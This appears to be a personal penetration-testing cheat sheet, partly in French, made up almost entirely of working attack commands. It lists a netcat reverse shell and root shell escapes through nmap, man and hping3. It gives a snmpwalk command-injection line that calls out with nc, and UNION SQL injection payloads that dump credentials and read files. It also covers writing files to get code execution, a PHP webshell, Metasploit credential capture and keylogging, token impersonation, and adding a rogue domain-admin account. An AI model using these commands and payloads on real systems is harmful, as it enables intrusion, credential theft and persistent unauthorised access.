
***********************************************************************************************
					PRIVESC (local)
***********************************************************************************************

root file with RW perms:
find / -user root -perm -o+w -type f 2> /dev/null  | grep -v /proc

windows password value in reg.keys:
reg query HKLM /f password /t REG_SZ /s

***********************************************************************************************
					PIVOTING
***********************************************************************************************

Port forwading SSH (useful!)
sur 127.0.0.1 taper: ssh -L 4455:192.168.12.103:443 kmkz@192.168.1.55 
access TCP 443 on 192.168.12.103 through 192.168.1.55 which is GW (enter 127.0.0.1:4455 into the browser)



TCP over http (for example but could be another protocol):
mknod backpipe p

RDP on 192.168.1.14 over HTTP from 192.168.1.253 (command to enter on pivot machine 192.168.1.253 to gain access on 192.168.1.14)

nc -l -p 8080 0<backpipe | nc <IP_TARGET>3389 1>backpipe


***********************************************************************************************
					GET	SHELL
***********************************************************************************************

Reverse Shell netcat:
nc -lvp 443      # Attacker listening for connection
nc -nv <IP Address> 443 -e /bin/sh  # Victim launch connection & give a shell


NMAP:
bash-3.2$ sudo /usr/bin/nmap --interactive 
 
Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !/bin/bash
bash-3.2# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
bash-3.2# 

HPING3:
/usr/sbin/hping3 <<< /bin/ls|
> ls
basewords.txt            dump_mitm3          hydra.restore      SCREENS        u1313g.xml.dif


SNMPWALK:
snmpwalk 192.168.1.15 $(nc -vv 192.168.1.42 8888 >> /tmp/t)

MAN:
root@w00t:~# man -P "/bin/ls $(whoami && /bin/sh)" ls
echo "test" > /tmp/tata
id
^Csh: 0: Can't open root
uid=0(root)
man: commande terminée avec 127 comme code de retour : sed -e '/^[[:space:]]*$/{ N; /^[[:space:]]*\n[[:space:]]*$/D; }' | (cd <fd 5> && LESS=-ix8RmPm Manual page ls(1) ?ltline %lt?L/%L.:byte %bB?s/%s..?e (END):?pB %pB\%.. (press h for help or q to quit)$PM Manual page ls(1) ?ltline %lt?L/%L.:byte %bB?s/%s..?e (END):?pB %pB\%.. (press h for help or q to quit)$ MAN_PN=ls(1) /bin/sh root
uid=0(root) gid=0(root) groupes=0(root))
root@w00t:~# cat /tmp/tata 
test


***********************************************************************************************
					 SQLi Basics 
***********************************************************************************************

SQLi:

number of column: 
	id=3 order by 100-- - // play on order by value to find number

Get vulnerable column:
	id=-3 union all select 1,2,3,4,5,6,7,8,9-- -

Get current user:
	id=-3 union all select 1,2,3,4,5,user(),7,8,9-- -

(View pentestmonkey or http://www.sqlinjection.net/union/ for ideas)



Get DBs :
	http://www.tata.com/index.php?id=-3 UNION SELECT 1,group_concat( schema_name,'<br>'),3,4,5 from information_schema.schemata -- -


List tables + columns:

	id=-3 UNION SELECT 1,group_concat(table_name,0x3a, column_name,'<br>'),3,4,5 from information_schema.columns where  table_schema ='DB_Cible' AND table_name LIKE '%user%' -- -

Same request based on columns names:
	-3 UNION SELECT 1,group_concat(table_name,0x3a, column_name,'<br>'),3,4,5 from information_schema.columns where  table_schema ='DB_Cible' AND column_name LIKE '%log%' -- -


Dump data from targeted DB + table + columns:
	-3 UNION SELECT 1,group_concat( login,0x3a,mdp,'<br>'),3,4,5 from DB_Cible.user -- - // here user is the previous identified table_name, it may change...


Read file:
	id=-3 UNION SELECT 1,load_file('/etc/hosts'),3,4,5  -- -


Code exec using "into outfile' (MySQL):
(phpinfo() payload in Hex.):
	-7 UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -



Webshell:
	<pre><?php if($_REQUEST["cmd"]) {passthru( $_REQUEST["cmd"]);}?></pre>



Blind detection:
	http://evil.com/index.php?id=29 and substring(version(),1,1)=5 -- -

	Sub SELECT ok:
		http://evil.com/index.php?id=29 and (select 1)=1  -- -
		

SQLMAP usage:
	Google chrome "export cookie" module + Burp proxy usage:
		sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3


	SQLMAP tor+WaF bypassing + DBG (users enumeration):
		sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --users --tamper "space2morehash.py"  -v 3  --check-tor --level=5 --risk=3 --threads=5 


	Tor usage: --tor --tor-type=SOCKS5
	Random useragent:  --random-agent


***********************************************************************************************
					FIREWALKING
***********************************************************************************************

FW bypassing over TCP by source port fixiation:
	traceroute  -p444 -T target-ip --sport=1111 -d --back -A --max-hops=16 


firewalk  -n  -pTCP -d target-port  last-node-ip target-ip -s source-port
	
-S usage (ports range):
	firewalk -n -S 20-445 -pTCPlast-node-ip  target-ip -s 1028

Trick:
	do not hesitate to play with src port value


nmap --script=firewalk --traceroute XXXXX  --osscan-guess -sV -O -Pn -d --top-port=20 --reason -f



***********************************************************************************************
					WIRELESS
***********************************************************************************************

WPA/WPA2:

	airmon-ng start wlan0

	wash -i mon0

	airodump-ng mon0

	reaver -i mon0 -b XX:XX:XX:XX:XX:XX 

	reaver -i mon0 -b XX:XX:XX:XX:XX:XX -vv



***********************************************************************************************
					OTHERS
***********************************************************************************************

dump bin to hex:
xxd -p   poc_cve_2015_0235 > dump.hex

reverse hex to bin:
xxd -p -r dump.hex > dumpfile.bin && chmod +x dumpfile.bin

Mail extraction from DB dump:
	grep -EiEio '\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}\b' * |sort |uniq -c |sort | grep -v "pattern1"| grep -v "pattern2" |grep -v "pattern3"|grep -v "pattern4"|grep -v "pattern5"| sed -r -e "s/^.*[,:]([^,:]+@[^,:]+).*$/\1/g" 

Vhosts enumeration:

cat vhosts.sh:
	#!/bin/bash

	echo""
	echo "[+] Finding VHOSTS for: $1"
	echo ""
	curl http://api.hackertarget.com/reverseiplookup/?q=$1

MSF Auxiliaries:
	auxiliary/scanner/portscan/tcp
	post/windows/gather/enum_logged_on_users
	post/multi/gather/dns_srv_lookup
	post/windows/gather/enum_applications
	post/windows/gather/enum_termserv (active RDP sessions)
	post/windows/gather/enum_putty_saved_sessions (if putty)
	post/windows/gather/credentials/credential_collector 
	post/windows/gather/enum_shares 
		auxiliary/scanner/smb/smb_enumshares // to view on which share we can access
	post/windows/gather/enum_snmp (SNMP on compromised host?)
	post/multi/recon/local_exploit_suggester 
	post/windows/gather/credentials/vnc
	auxiliary/admin/mysql/mysql_enum
	
	Use the capture module for all protocols like SMB in order to collect creds:
		auxiliary/server/capture/smb
		http://www.adeptus-mechanicus.com/codex/metalan/metalan.html
	
Metepreter keylogging:
	keyscan:
		https://www.offensive-security.com/metasploit-unleashed/keylogging/
		
	post/windows/capture/keylog_recorder 
	
Domain admin "problem":
	use incognito
	list_tokens -u
	impersonate_token DOMAIN.DOM\\Domain_Admin_user
	
	- The spawn shell and:
		net user Pentester tAT@M45t3r /ADD /DOMAIN
		net group "Admin du domaine" Pentester /ADD
	
Winlogon RegKey passwd research/access (psexec 4 privesc):
	C:\xampp\webdav>reg query HKLM /f password /t REG_SZ /s

Host discovery:
	nmap -sn 10.11.1.1-254 -oG ping_sweep_nmap.grep
        grep Up ping_sweep_nmap.grep |cut -d " " -f2 >> list.txt
	
ALWAYS:
	View ARP cache on each machine
	View netstat output
	Look for new subnet to pivot & pwn ! 
	
Todo:
	Be Exhaustive in the security issues?
	
	Service fingerprinting
	Null Sessions + default passwords
	
	chek local FW:
		 netsh advfirewall firewall show rule name=all
	
	SMB vuln. assessment:
		nmap -v -p 445 --script=smb-vuln-* --script-args=unsafe=1 -iL List_windows.grep -Pn
		
	Test all http 80/443 (if custom then launch dirb on it)
	
	Identify/test network equipments:
		scan tcp 22,21,23 and udp 161 (snmp)
		
	
	if SNMP discovered:
		BF community by using custom script

Pwn the scope:
	https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials
	example:
		crackmapexec <protocol> <target(s)> -u username -p password
	
	use cmedb to view stored datas